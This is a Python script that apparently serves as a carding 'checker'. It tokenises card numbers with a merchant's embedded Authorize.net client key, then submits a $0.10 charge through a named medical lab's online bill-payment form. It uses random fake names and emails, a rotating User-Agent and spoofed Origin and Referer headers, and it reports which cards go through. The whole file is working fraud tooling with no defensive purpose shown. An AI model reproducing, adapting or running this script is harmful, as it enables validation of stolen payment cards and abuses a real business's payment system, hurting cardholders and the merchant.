# === Basic Coders  ===
# === @S4J4G ===
import requests, random, string, uuid, json
from fake_useragent import UserAgent

# === Random Generators ===
def random_string(length):
    return ''.join(random.choices(string.ascii_letters, k=length))

def random_email():
    return f"{random_string(7).lower()}@gmail.com"

# === Rotate User-Agent each run ===
ua = UserAgent()
USER_AGENT = ua.random
print("[✓] Using User-Agent:", USER_AGENT)

# === Generate Token ===
def generate_token(card_number, expiry, cvv):
    url = "https://api2.authorize.net/xml/v1/request.api"
    payload = {
        "securePaymentContainerRequest": {
            "merchantAuthentication": {
                "name": "3c5Q9QdJW",
                "clientKey": "2n7ph2Zb4HBkJkb8byLFm7stgbfd8k83mSPWLW23uF4g97rX5pRJNgbyAe2vAvQu"
            },
            "data": {
                "type": "TOKEN",
                "id": str(uuid.uuid4()),
                "token": {
                    "cardNumber": card_number,
                    "expirationDate": expiry,
                    "cardCode": cvv
                }
            }
        }
    }

    headers = {
        "Content-Type": "application/json",
        "Origin": "https://avanticmedicallab.com",
        "Referer": "https://avanticmedicallab.com/",
        "User-Agent": USER_AGENT
    }

    try:
        r = requests.post(url, headers=headers, json=payload)
        text = r.text.lstrip("\ufeff").strip()
        res = json.loads(text)
        if 'opaqueData' in res:
            token = res['opaqueData']['dataValue']
            print("[✓] Token Generated Successfully")
            return token
        else:
            print("[×] Token field not found")
            print("Response:", res)
            return None
    except Exception as e:
        print("[×] Token generation error:", e)
        print("Status:", r.status_code)
        print("Raw:", r.text[:500])
        return None

# === Submit Payment Form ===
def submit_payment_form(opaque_token):
    url = "https://avanticmedicallab.com/wp-admin/admin-ajax.php"

    fname = random_string(6)
    lname = random_string(6)
    email = random_email()

    payload = {
        "wpforms[fields][1][first]": fname,
        "wpforms[fields][1][last]": lname,
        "wpforms[fields][17]": "0.10",
        "wpforms[fields][2]": email,
        "wpforms[fields][3]": "(219) 767-6687",
        "wpforms[fields][14]": "8383993",
        "wpforms[fields][4][address1]": "New York",
        "wpforms[fields][4][city]": "New York",
        "wpforms[fields][4][state]": "NY",
        "wpforms[fields][4][postal]": "10080",
        "wpforms[fields][6]": "$ 0.10",
        "wpforms[fields][11][]": "By clicking on Pay Now button you have read and agreed...",
        "wpforms[id]": "4449",
        "wpforms[author]": "1",
        "wpforms[post_id]": "3388",
        "wpforms[authorize_net][opaque_data][descriptor]": "COMMON.ACCEPT.INAPP.PAYMENT",
        "wpforms[authorize_net][opaque_data][value]": opaque_token,
        "wpforms[authorize_net][card_data][expire]": "10/29",
        "wpforms[token]": "9cff5ad72e99e94c7d3e6be68b7cd5d7",
        "action": "wpforms_submit",
        "page_url": "https://avanticmedicallab.com/pay-bill-online/",
        "page_title": "Pay Bill Online",
        "page_id": "3388"
    }

    headers = {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "https://avanticmedicallab.com",
        "Referer": "https://avanticmedicallab.com/pay-bill-online/",
        "User-Agent": USER_AGENT,
        "X-Requested-With": "XMLHttpRequest",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty"
    }

    response = requests.post(url, data=payload, headers=headers)
    print("Form Submit Status:", response.status_code)

    try:
        res_json = response.json()
        success_flag = res_json.get("success", False)

        if success_flag is True:
            print("[✓] Payment Successful!")
            print("Success:", success_flag)
        else:
            print("[×] Transaction Failed.")
            print("Success:", success_flag)
    except Exception:
        print("[×] Failed to parse response.")
        print("Raw Response (first 300):\n", response.text[:300])

# === RUN ===
card = "424224242424242"
exp = "1029"
cvv = "701"

token = generate_token(card, exp, cvv)
if token:
    submit_payment_form(token)
else:
    print("⛔ Token was not generated, form not submitted.")

